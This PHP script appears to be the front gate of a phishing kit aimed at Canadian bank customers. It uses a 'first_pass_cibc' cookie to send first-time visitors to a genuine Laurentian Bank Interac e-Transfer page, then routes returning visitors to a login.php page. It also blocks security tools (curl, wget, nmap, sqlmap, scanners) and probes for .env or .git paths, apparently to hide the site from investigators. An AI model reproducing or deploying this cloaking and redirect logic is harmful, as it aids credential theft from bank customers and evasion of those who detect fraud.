<?php
declare(strict_types=1);

// ---------------------- SET TIMEZONE ----------------------
date_default_timezone_set('America/Edmonton');

// ---------------------- START SESSION ----------------------
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}

// ---------------------- SANITIZE PAGE KEY ----------------------
$pageKey = $_GET['pageKey'] ?? 'default_page';
$pageKey = preg_replace('/[^A-Za-z0-9_]/', '', $pageKey);

// ---------------------- FORCE HTTPS ----------------------
$isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
    || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (!$isHttps) {
    $httpsUrl = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header("Location: $httpsUrl", true, 301);
    exit;
}

// ---------------------- NO CACHE ----------------------
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');

// ---------------------- BLOCK SCANNERS / BOTS ----------------------
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$blockedAgents = [
    'curl', 'wget', 'python', 'java', 'go-http',
    'httpclient', 'nmap', 'nikto', 'sqlmap',
    'dirbuster', 'scanner', 'fuzzer', 'spider', 'bot'
];

foreach ($blockedAgents as $agent) {
    if (strpos($userAgent, $agent) !== false) {
        http_response_code(403);
        exit('Access denied');
    }
}

// ---------------------- BLOCK SENSITIVE PATHS ----------------------
$requestUri = strtolower($_SERVER['REQUEST_URI'] ?? '');
$blockedPaths = ['.env', '.git', 'wp-admin', 'wp-login', 'phpinfo', 'backup', 'dump', 'sql', 'config'];

foreach ($blockedPaths as $path) {
    if (strpos($requestUri, $path) !== false) {
        http_response_code(404);
        exit('Not found');
    }
}

// ---------------------- FIRST VISIT COOKIE REDIRECT ----------------------
$cookieName    = "first_pass_cibc_$pageKey";
$firstVisitUrl = "https://lbcweb.laurentianbank.ca/lang/en/m/OnlineBanking/InteracTransfers/ReceiveLanding/";
$returnUrl     = "login.php";

if (!isset($_COOKIE[$cookieName])) {
    setcookie($cookieName, '1', [
        'expires' => time() + 1800, // 30 minutes
        'path' => '/',
        'secure' => true,
        'httponly' => true,
        'samesite' => 'Strict'
    ]);
    header("Location: $firstVisitUrl", true, 302);
    exit;
}

// ---------------------- SECURITY HEADERS ----------------------
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header('Permissions-Policy: geolocation=(), microphone=(), camera=()');

header("Content-Security-Policy: default-src 'self' https: data:; " .
       "script-src 'self' 'unsafe-inline' https:; " .
       "style-src 'self' 'unsafe-inline' https:; " .
       "img-src 'self' data: https:; " .
       "font-src 'self' data:;");

// ---------------------- FINAL REDIRECT ----------------------
header("Location: $returnUrl", true, 302);
exit;
